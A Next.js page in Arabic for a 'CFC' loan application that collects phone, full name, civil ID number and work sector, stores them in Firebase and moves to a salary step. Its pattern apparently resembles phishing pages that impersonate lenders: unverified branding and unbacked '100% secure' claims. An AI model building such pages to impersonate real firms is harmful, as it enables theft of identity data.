"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { addData } from "@/lib/firebase";
import {
  Menu,
  ChevronRight,
  Check,
  User,
  PhoneIcon,
  CreditCard,
  Briefcase,
  Shield,
  Clock,
} from "lucide-react";
import { useRouter } from "next/navigation";
import type React from "react";
import { useState } from "react";

export default function LoanApplicationPage() {
  const [name, setName] = useState("");
  const [idnumber, setIdnumber] = useState("");
  const [phone, setPhone] = useState("");
  const [workSector, setWorkSector] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {};

    if (!phone || phone.length !== 10) {
      newErrors.phone = "يرجى إدخال رقم هاتف صحيح (10 أرقام)";
    }

    if (!name || name.trim().length < 3) {
      newErrors.name = "يرجى إدخال الاسم الكامل";
    }

    if (!idnumber || idnumber.length < 10) {
      newErrors.idnumber = "يرجى إدخال رقم مدني صحيح";
    }

    if (!workSector) {
      newErrors.workSector = "يرجى اختيار قطاع العمل";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      const visitorId =
        localStorage.getItem("visitor") || `visitor-${Date.now()}`;
      localStorage.setItem("visitor", visitorId);

      await addData({
        id: visitorId,
        name,
        idnumber,
        phone,
        workSector,
        applicationDate: new Date().toISOString(),
      });

      router.push("/loan-application/salary");
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrors({
        submit: "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div
      className="min-h-screen bg-gradient-to-b from-gray-50 to-white"
      dir="rtl"
    >
      {/* Header */}
      <header className="sticky top-0 z-50 bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 text-white shadow-lg backdrop-blur-sm">
        <div className="flex items-center justify-between max-w-md mx-auto p-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-white/10 backdrop-blur-md rounded-xl flex items-center justify-center shadow-lg border border-white/20">
              <img
                src="/next.svg"
                width={70}
                alt="CFC Logo"
                className="brightness-0 invert"
              />
            </div>
            <div className="flex flex-col">
              <span className="font-bold text-lg tracking-tight">CFC</span>
              <span className="text-xs text-blue-100">طلب تمويل</span>
            </div>
          </div>
          <button className="w-10 h-10 rounded-lg bg-white/10 backdrop-blur-md flex items-center justify-center hover:bg-white/20 transition-all border border-white/20">
            <Menu className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Progress Indicator */}
      <div className="max-w-md mx-auto px-6 py-6">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center shadow-md">
              <Check className="w-5 h-5 text-white" />
            </div>
            <span className="text-sm font-semibold text-blue-600">
              المعلومات الشخصية
            </span>
          </div>
          <div className="flex-1 h-0.5 bg-gray-200 mx-3"></div>
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center">
              <span className="text-sm font-semibold text-gray-400">2</span>
            </div>
            <span className="text-sm text-gray-400">معلومات الراتب</span>
          </div>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 h-2 rounded-full w-1/2 transition-all duration-500"></div>
        </div>
      </div>

      {/* Main Content */}
      <form
        className="max-w-md mx-auto px-6 pb-8 space-y-6"
        onSubmit={handleSubmit}
      >
        {/* Trust Badges */}
        <div className="grid grid-cols-3 gap-3">
          <Card className="border-0 shadow-sm bg-gradient-to-br from-blue-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto">
                <Shield className="w-5 h-5 text-blue-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">آمن ١٠٠٪</p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-green-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto">
                <Clock className="w-5 h-5 text-green-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">
                موافقة سريعة
              </p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-purple-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto">
                <Check className="w-5 h-5 text-purple-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">بدون كفيل</p>
            </CardContent>
          </Card>
        </div>

        {/* Application Form */}
        <Card className="shadow-lg border-0 overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <User className="w-5 h-5" />
              المعلومات الشخصية
            </h2>
            <p className="text-xs text-blue-100 mt-1">
              يرجى ملء جميع الحقول بدقة
            </p>
          </div>

          <CardContent className="p-6 space-y-5">
            {/* Phone Number Field */}
            <div className="space-y-2">
              <Label
                htmlFor="phone"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <PhoneIcon className="w-4 h-4 text-blue-600" />
                رقم الهاتف
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Input
                id="phone"
                type="tel"
                maxLength={10}
                placeholder="05xxxxxxxx"
                value={phone}
                onChange={(e) => {
                  setPhone(e.target.value.replace(/\D/g, ""));
                  if (errors.phone) setErrors({ ...errors, phone: "" });
                }}
                className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 text-lg ${
                  errors.phone ? "border-red-500" : ""
                }`}
                dir="ltr"
              />
              {errors.phone && (
                <p className="text-xs text-red-600 text-right">
                  {errors.phone}
                </p>
              )}
            </div>

            {/* Name Field */}
            <div className="space-y-2">
              <Label
                htmlFor="name"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <User className="w-4 h-4 text-blue-600" />
                الاسم الكامل
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Input
                id="name"
                type="text"
                placeholder="أدخل اسمك الكامل"
                value={name}
                onChange={(e) => {
                  setName(e.target.value);
                  if (errors.name) setErrors({ ...errors, name: "" });
                }}
                className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 ${
                  errors.name ? "border-red-500" : ""
                }`}
                dir="rtl"
              />
              {errors.name && (
                <p className="text-xs text-red-600 text-right">{errors.name}</p>
              )}
            </div>

            {/* ID Number Field */}
            <div className="space-y-2">
              <Label
                htmlFor="idnumber"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <CreditCard className="w-4 h-4 text-blue-600" />
                الرقم المدني
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Input
                id="idnumber"
                type="tel"
                placeholder="أدخل رقمك المدني"
                value={idnumber}
                onChange={(e) => {
                  setIdnumber(e.target.value.replace(/\D/g, ""));
                  if (errors.idnumber) setErrors({ ...errors, idnumber: "" });
                }}
                className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 text-lg ${
                  errors.idnumber ? "border-red-500" : ""
                }`}
                dir="ltr"
              />
              {errors.idnumber && (
                <p className="text-xs text-red-600 text-right">
                  {errors.idnumber}
                </p>
              )}
            </div>

            {/* Work Sector Field */}
            <div className="space-y-2">
              <Label
                htmlFor="workSector"
                className="text-right block font-semibold text-gray-800 flex items-center gap-2"
              >
                <Briefcase className="w-4 h-4 text-blue-600" />
                قطاع العمل
                <Badge variant="secondary" className="mr-auto text-xs">
                  مطلوب
                </Badge>
              </Label>
              <Select
                dir="rtl"
                value={workSector}
                onValueChange={(value) => {
                  setWorkSector(value);
                  if (errors.workSector)
                    setErrors({ ...errors, workSector: "" });
                }}
              >
                <SelectTrigger
                  className={`text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12 ${
                    errors.workSector ? "border-red-500" : ""
                  }`}
                >
                  <SelectValue placeholder="اختر قطاع العمل" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="government">القطاع الحكومي</SelectItem>
                  <SelectItem value="private">القطاع الخاص</SelectItem>
                  <SelectItem value="oil">القطاع النفطي</SelectItem>
                  <SelectItem value="banking">القطاع المصرفي</SelectItem>
                  <SelectItem value="education">قطاع التعليم</SelectItem>
                  <SelectItem value="health">القطاع الصحي</SelectItem>
                  <SelectItem value="military">القطاع العسكري</SelectItem>
                </SelectContent>
              </Select>
              {errors.workSector && (
                <p className="text-xs text-red-600 text-right">
                  {errors.workSector}
                </p>
              )}
            </div>

            {/* Submit Error */}
            {errors.submit && (
              <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                <p className="text-sm text-red-600 text-right">
                  {errors.submit}
                </p>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Submit Button */}
        <Button
          type="submit"
          disabled={isSubmitting}
          className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white h-14 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isSubmitting ? (
            <span className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              جاري الإرسال...
            </span>
          ) : (
            <span className="flex items-center gap-2 justify-center">
              التالي
              <ChevronRight className="w-5 h-5" />
            </span>
          )}
        </Button>

        {/* Promotional Section */}
        <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 text-white rounded-2xl shadow-xl overflow-hidden border-0">
          <CardContent className="p-8 relative">
            {/* Background Decorations */}
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-16 translate-x-16"></div>
            <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-12 -translate-x-12"></div>
            <div className="absolute top-1/2 left-1/2 w-20 h-20 bg-white/5 rounded-full -translate-x-10 -translate-y-10"></div>

            {/* Content */}
            <div className="relative z-10 text-center space-y-6">
              <div className="w-20 h-20 bg-white/20 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm border border-white/30 shadow-lg transform rotate-12">
                <div className="text-3xl font-bold transform -rotate-12">
                  💰
                </div>
              </div>

              <div>
                <h3 className="text-xl font-bold mb-3">تمويلنا يساعدك</h3>
                <div className="grid grid-cols-2 gap-3 text-sm">
                  <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                    <p className="font-semibold">لتحقيق أهدافك المستقبلية</p>
                  </div>
                  <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                    <p className="font-semibold">لضمان نجاح مشروعك</p>
                  </div>
                  <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                    <p className="font-semibold">لتعليم أولادك</p>
                  </div>
                  <div className="bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                    <p className="font-semibold">لتنمية متطلباتك</p>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Security Notice */}
        <div className="bg-gray-50 border border-gray-200 rounded-xl p-4">
          <div className="flex items-start gap-3">
            <Shield className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-gray-900 mb-1">
                معلوماتك في أمان
              </p>
              <p className="text-xs text-gray-600 leading-relaxed">
                جميع بياناتك محمية بأعلى معايير الأمان والخصوصية. نحن ملتزمون
                بحماية معلوماتك الشخصية.
              </p>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
